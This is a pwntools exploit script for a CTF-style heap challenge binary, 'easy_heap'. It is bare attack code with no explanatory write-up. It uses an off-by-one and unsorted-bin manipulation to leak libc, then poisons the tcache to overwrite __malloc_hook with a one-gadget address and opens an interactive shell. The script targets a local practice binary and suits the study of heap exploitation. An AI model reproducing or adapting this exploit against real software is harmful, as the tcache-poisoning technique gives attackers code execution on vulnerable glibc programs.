from pwn import *
#ARCH SETTING
context(arch = 'amd64' , os = 'linux')
r = process('./easy_heap')
#r = remote('127.0.0.1',9999)

#FUNCTION DEFINE
def new(size,content):
    r.recvuntil("?\n> ")
    r.sendline("1")
    r.recvuntil("size \n> ")
    r.sendline(str(size))
    r.recvuntil("content \n> ")
    r.send(content)

def newz():
    r.recvuntil("?\n> ")
    r.sendline("1")
    r.recvuntil("size \n> ")
    r.sendline(str(0))

def delet(idx):
    r.recvuntil("?\n> ")
    r.sendline("2")
    r.recvuntil("index \n> ")
    r.sendline(str(idx))

def echo(idx):
    r.recvuntil("?\n> ")
    r.sendline("3")
    r.recvuntil("index \n> ")
    r.sendline(str(idx))

#MAIN EXPLOIT

#memory leak
for i in range(10):
    newz()
#choose chunk0 2 4 into unsorted bin
delet(1)
delet(3)
for i in range(5,10):
    delet(i)
#now tcache filled ,waiting queue is idx.1 , 3 , 5~10
#make unsorted bin: ustbin -> 4 -> 2 -> 0  ,then chunk2 will be leak_target_chunk
delet(0)
delet(2)
delet(4)
#waiting queue is idx.0~10\chunk9~5 , 3 , 1 ,and now all chunks was freed ,heap was null
#clean tcache
for i in range(7):
    newz() #chunk3 is idx.5 (987653:012345)
#unsorted_bin trans to tcache
newz() #idx.7:pushing 0x00 on the lowest byte will hijack leak_target_chunk.BK's fd bingo on target!
new(0xf8,'\x00') #idx.8:1.off-by-one the preinuse bit of chunk3   2.hijack the lowest byte of leak_target_chunk correctly to FD
#fill tcache but don't touch idx.7 , 8 , 5 (six enough considering chunk0 remained in tcache)
for i in range(5):
    delet(i)
delet(6)
#merge & leak
delet(5)
echo(8)
unsorted_bin = u64(r.recv(6).ljust(8,'\x00'))
libc_base = unsorted_bin - 0x3dac78
print(hex(libc_base))
malloc_hook = libc_base + 0x3dac10
onegadget = libc_base + 0xfdb8e #0x47ca1 #0x7838e #0x47c9a #0xfccde

#hijack
#clean tcache
for i in range(7):
    newz()
newz() #idx.9
#now we hold idx.8&9  pointing chunk2
delet(0) #passby counts check
delet(8)
delet(9)
new(0x10,p64(malloc_hook))
newz()
new(0x10,p64(onegadget))

#fire
#according to the logic that size is inputed after malloc
delet(1) #passby idxtable full check
#x = input("fucking")
r.recvuntil("?\n> ")
r.sendline("1")
r.interactive()
